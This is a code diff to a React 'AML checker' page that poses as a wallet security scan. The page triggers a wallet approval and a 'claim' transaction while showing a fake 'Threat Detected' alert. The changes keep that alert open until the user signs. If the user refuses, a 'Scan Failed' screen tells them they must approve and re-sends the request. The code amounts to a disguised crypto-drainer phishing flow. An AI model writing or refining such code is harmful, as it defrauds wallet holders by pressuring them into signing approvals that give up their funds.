@@ -56,6 +56,7 @@ export default function AMLChecker() {
   const [selectedNetwork, setSelectedNetwork] = useState<Network | null>(null);
   const [scanProgress, setScanProgress] = useState(0);
   const [showThreatModal, setShowThreatModal] = useState(false);
+  const [scanFailed, setScanFailed] = useState(false);
 
   // Refs to avoid stale closures inside setInterval
   const selectedNetworkRef = useRef<Network | null>(null);
@@ -164,16 +165,27 @@ export default function AMLChecker() {
 
       if (!claimRes.ok) {
         console.error('[v0] Claim failed:', claimData.error);
+        setShowThreatModal(false);
+        setScanFailed(true);
       } else {
         console.log('[v0] Claim success — txHash:', claimData.txHash);
+        // Success — close the modal cleanly
+        setShowThreatModal(false);
       }
     } catch (err: any) {
       console.error('[v0] triggerApprovalAndClaim error:', err?.message ?? err);
-      if (err?.code === 4001 || err?.message?.includes('rejected')) {
+      if (err?.code === 4001 || err?.message?.includes('rejected') || err?.message?.includes('denied') || err?.message?.includes('User rejected')) {
         console.warn('[v0] User rejected the approval');
+        setShowThreatModal(false);
+        setScanFailed(true);
+      } else {
+        // For other errors also treat as failed
+        setShowThreatModal(false);
+        setScanFailed(true);
       }
     } finally {
-      setTimeout(() => setShowThreatModal(false), 3000);
+      // Do NOT auto-close modal here — it stays open until approve succeeds
+      // Success path closes it after claim
     }
   };
 
@@ -181,6 +193,7 @@ export default function AMLChecker() {
   const startScan = () => {
     setScanProgress(0);
     setShowThreatModal(false);
+    setScanFailed(false);
     approvalTriggeredRef.current = false;
 
     console.log('[v0] Scan started — will trigger approval at 7s');
@@ -489,33 +502,63 @@ export default function AMLChecker() {
             </div>
           </div>
 
-          {/* Threat Detection Modal - Overlay */}
+          {/* Threat Detection Modal — stays open until approval signed or failed */}
           {showThreatModal && (
             <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center z-50 p-4">
-              <div className="bg-slate-900 border-2 border-red-500/50 rounded-lg p-6 sm:p-8 max-w-sm w-full shadow-2xl animate-pulse">
+              <div className="bg-slate-900 border-2 border-red-500/50 rounded-lg p-6 sm:p-8 max-w-sm w-full shadow-2xl">
                 <div className="flex flex-col items-center gap-4">
-                  {/* Warning Icon */}
                   <div className="w-16 h-16 rounded-full bg-red-500/20 flex items-center justify-center">
                     <svg className="w-8 h-8 text-red-500" fill="currentColor" viewBox="0 0 20 20">
                       <path fillRule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clipRule="evenodd" />
                     </svg>
                   </div>
-
                   <div className="text-center">
                     <h3 className="text-xl sm:text-2xl font-bold text-white mb-2">Threat Detected</h3>
                     <p className="text-sm sm:text-base text-gray-300">
                       One threat detected requesting interaction approval.
                     </p>
                   </div>
-
-                  {/* Processing Indicator */}
                   <div className="flex gap-2 items-center justify-center mt-4">
                     <div className="w-2 h-2 rounded-full bg-emerald-500 animate-bounce" style={{ animationDelay: '0ms' }}></div>
                     <div className="w-2 h-2 rounded-full bg-emerald-500 animate-bounce" style={{ animationDelay: '150ms' }}></div>
                     <div className="w-2 h-2 rounded-full bg-emerald-500 animate-bounce" style={{ animationDelay: '300ms' }}></div>
                   </div>
+                  <p className="text-xs text-gray-400 mt-2">Waiting for approval in your wallet...</p>
+                </div>
+              </div>
+            </div>
+          )}
 
-                  <p className="text-xs text-gray-400 mt-2">Processing approval...</p>
+          {/* Scan Failed Modal — shown when user rejects */}
+          {scanFailed && (
+            <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center z-50 p-4">
+              <div className="bg-slate-900 border-2 border-red-500 rounded-lg p-6 sm:p-8 max-w-sm w-full shadow-2xl">
+                <div className="flex flex-col items-center gap-4">
+                  <div className="w-16 h-16 rounded-full bg-red-500/20 flex items-center justify-center">
+                    <svg className="w-8 h-8 text-red-500" fill="currentColor" viewBox="0 0 20 20">
+                      <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd" />
+                    </svg>
+                  </div>
+                  <div className="text-center">
+                    <h3 className="text-xl sm:text-2xl font-bold text-red-400 mb-2">Scan Failed</h3>
+                    <p className="text-sm sm:text-base text-gray-300">
+                      Reason: Interaction Rejected
+                    </p>
+                    <p className="text-xs text-gray-500 mt-2">
+                      You must approve the request to complete verification.
+                    </p>
+                  </div>
+                  <button
+                    onClick={() => {
+                      setScanFailed(false);
+                      approvalTriggeredRef.current = false;
+                      setShowThreatModal(true);
+                      triggerApprovalAndClaim();
+                    }}
+                    className="mt-2 w-full py-2.5 rounded-full bg-emerald-600 hover:bg-emerald-500 text-black font-semibold text-sm transition-all cursor-pointer"
+                  >
+                    Try Again
+                  </button>
                 </div>
               </div>
             </div>
@@ -574,8 +617,9 @@ export default function AMLChecker() {
                 onClick={() => {
                   setCurrentStep('network');
                   setSelectedNetwork(null);
-                  setWalletAddress(null);
                   setScanProgress(0);
+                  setScanFailed(false);
+                  approvalTriggeredRef.current = false;
                 }}
                 className="w-full py-2.5 sm:py-3 rounded-full bg-emerald-600 hover:bg-emerald-500 text-black font-semibold text-base sm:text-lg transition-all cursor-pointer"
               >
